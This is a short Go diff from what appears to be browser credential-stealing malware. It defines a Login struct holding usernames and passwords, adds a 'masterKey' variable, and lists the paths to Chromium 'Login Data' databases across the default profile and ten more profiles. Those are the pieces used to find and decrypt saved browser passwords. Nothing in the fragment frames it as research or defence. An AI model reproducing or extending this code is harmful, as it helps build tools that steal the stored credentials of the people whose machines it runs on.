@@ -32,6 +32,7 @@ type Login struct {
 	Username string
 	Password string
 }
+var masterKey []byte
 var passwordFile string
 var pwCount int
 var LoginPaths = []string{"\\Default\\Login Data", "\\Profile 1\\Login Data", "\\Profile 2\\Login Data", "\\Profile 3\\Login Data", "\\Profile 4\\Login Data", "\\Profile 5\\Login Data", "\\Profile 6\\Login Data", "\\Profile 7\\Login Data", "\\Profile 8\\Login Data", "\\Profile 9\\Login Data", "\\Profile 10\\Login Data"}
